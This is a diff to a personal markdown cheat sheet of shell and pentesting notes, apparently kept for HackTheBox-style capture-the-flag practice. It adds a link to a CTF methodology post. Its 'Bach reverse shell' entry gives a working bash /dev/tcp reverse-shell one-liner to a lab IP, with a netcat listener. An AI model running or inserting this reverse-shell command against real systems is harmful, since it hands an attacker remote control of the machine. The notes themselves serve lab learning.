@@ -31,9 +31,13 @@ $ arp                        # manipulate the system ARP cache
  ```$ file testfile.file```   # outputs  **testfile.file: GIF image data**
 
 
-### Bach reverse shell
+
+### Hack the box
+https://0x00sec.org/t/my-hackthebox-ctf-methodology-from-fresh-box-to-root/13980
+
+**Bach reverse shell**
 * https://github.com/fijimunkii/bash-dev-tcp/blob/master/reverse-shell
-* Example: ```bash -i >& /dev/tcp/10.10.14.150/9001 0>&1```   plus   ```nc -lvnp 9001``` to listen
+Example: ```bash -i >& /dev/tcp/10.10.14.150/9001 0>&1```   plus   ```nc -lvnp 9001``` to listen
 
 
 ### DNS configuration issues
